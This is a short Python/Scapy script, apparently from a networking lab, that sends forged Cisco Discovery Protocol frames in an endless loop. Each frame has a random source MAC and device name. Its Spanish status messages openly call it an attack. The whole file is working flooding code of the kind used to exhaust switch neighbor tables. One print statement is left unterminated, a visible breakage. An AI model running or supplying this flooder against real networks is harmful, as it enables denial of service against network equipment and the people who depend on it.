from scapy.all import *
import time
import random
import struct


def cdp_checksum(payload):
    if len(payload) % 2:
        payload += b'\x00'

    total = sum(struct.unpack("!%dH" % (len(payload) // 2), payload))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)

    return (~total) & 0xFFFF


print("[*] Atacando maigunes


try:
    while True:
       
        nombre_disp = f"LAB-{random.randint(1000,9999)}".encode()

        tlv_device = b'\x00\x01' + struct.pack("!H", len(nombre_disp) + 4) + nombre_disp
        tlv_interface = b'\x00\x03\x00\x16GigabitEthernet0/1'
        tlv_caps = b'\x00\x04\x00\x08\x00\x00\x00\x01'

       
        cdp_base = b'\x02\xb4\x00\x00' + tlv_device + tlv_interface + tlv_caps

       
        checksum_real = cdp_checksum(cdp_base)
        cdp_payload = cdp_base[:2] + struct.pack("!H", checksum_real) + cdp_base[4:]

      
        frame = (
            Ether(src=RandMAC(), dst="01:00:0c:cc:cc:cc") /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2000) /
            Raw(load=cdp_payload)
        )

        sendp(frame, iface="eth0", verbose=False)
        time.sleep(0.05)

except KeyboardInterrupt:
    print("\n[!] termino maigunes.")


